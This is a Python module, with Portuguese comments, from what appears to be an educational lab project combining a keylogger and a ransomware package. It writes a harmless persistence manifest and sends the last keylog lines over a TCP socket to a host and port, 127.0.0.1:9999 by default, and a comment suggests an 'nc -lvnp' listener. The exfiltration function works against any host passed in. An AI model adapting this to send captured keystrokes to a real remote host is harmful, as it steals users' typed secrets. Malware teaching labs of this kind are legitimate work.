from datetime import datetime, timezone
import json
from pathlib import Path
import socket

from keylogger.logger import DEFAULT_KEYLOG_FILE
from ransomware.key_manager import LOGS_DIR, garantir_caminho_seguro, registrar_evento


PERSISTENCE_SIM_FILE = (LOGS_DIR / "sim_persistence.json").resolve()
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 9999


class SimulatorError(Exception):
    """Exceção específica para falhas na simulação de persistência ou envio."""


def simular_persistencia(arquivo_saida: Path = PERSISTENCE_SIM_FILE) -> Path:
    """Gera uma simulação inofensiva de persistência apenas dentro de logs/."""
    LOGS_DIR.mkdir(parents=True, exist_ok=True)
    destino = garantir_caminho_seguro(arquivo_saida, LOGS_DIR)

    manifesto_persistencia = {
        "modo": "SIMULACAO_EDUCACIONAL_INOFENSIVA",
        "observacao": "Nenhuma alteracao foi aplicada ao sistema operacional real.",
        "conceito_tecnico": "Inicializacao automatica de servico/script no login do usuario",
        "exemplo_conceitual_linux": "Entrada de autostart / unidade de usuario simulada (nao instalada)",
        "criado_em_utc": datetime.now(timezone.utc).isoformat(),
    }

    try:
        destino.write_text(json.dumps(manifesto_persistencia, indent=2, ensure_ascii=False), encoding="utf-8")
        registrar_evento(
            modulo="keylogger.simulator",
            acao="simular_persistencia_sucesso",
            detalhes={"arquivo_simulacao": destino.name},
        )
        return destino
    except OSError as exc:
        registrar_evento(
            modulo="keylogger.simulator",
            acao="simular_persistencia_erro",
            detalhes={"arquivo_simulacao": destino.name, "erro": str(exc)},
        )
        raise SimulatorError(f"Falha ao gerar simulação de persistência: {exc}") from exc


def simular_transmissao_rede(
    host: str = DEFAULT_HOST,
    porta: int = DEFAULT_PORT,
    arquivo_log: Path = DEFAULT_KEYLOG_FILE,
    timeout: float = 5.0,
) -> dict:
    """Simula o envio de dados fictícios de log para um receptor local/de laboratório."""
    LOGS_DIR.mkdir(parents=True, exist_ok=True)
    origem_log = garantir_caminho_seguro(arquivo_log, LOGS_DIR)

    if origem_log.exists():
        linhas = origem_log.read_text(encoding="utf-8").splitlines()
    else:
        linhas = []

    amostra = linhas[-10:] if linhas else ["[SIMULACAO] Nenhum registro previo; payload ficticio de teste."]

    payload = {
        "tipo": "EXFILTRACAO_SIMULADA_LAB",
        "timestamp_utc": datetime.now(timezone.utc).isoformat(),
        "origem_arquivo": origem_log.name,
        "total_linhas_log": len(linhas),
        "amostra_registros": amostra,
    }
    dados_bytes = (json.dumps(payload, ensure_ascii=False) + "\n").encode("utf-8")

    try:
        with socket.create_connection((host, porta), timeout=timeout) as conexao:
            conexao.sendall(dados_bytes)

        resultado = {
            "enviado": True,
            "destino": f"{host}:{porta}",
            "bytes_enviados": len(dados_bytes),
        }
        registrar_evento(
            modulo="keylogger.simulator",
            acao="simular_transmissao_sucesso",
            detalhes=resultado,
        )
        return resultado
    except OSError as exc:
        resultado = {
            "enviado": False,
            "destino": f"{host}:{porta}",
            "erro": str(exc),
        }
        registrar_evento(
            modulo="keylogger.simulator",
            acao="simular_transmissao_sem_receptor",
            detalhes=resultado,
        )
        return resultado


if __name__ == "__main__":
    arq_persistencia = simular_persistencia()
    print(f"Persistência simulada salva em: {arq_persistencia}")

    # Para testar envio real na rede do lab, abra um listener antes (ex.: nc -lvnp 9999)
    # e passe --host / --port ou ajuste na chamada abaixo.
    res_rede = simular_transmissao_rede(host=DEFAULT_HOST, porta=DEFAULT_PORT)
    print(f"Resultado da transmissão simulada: {res_rede}")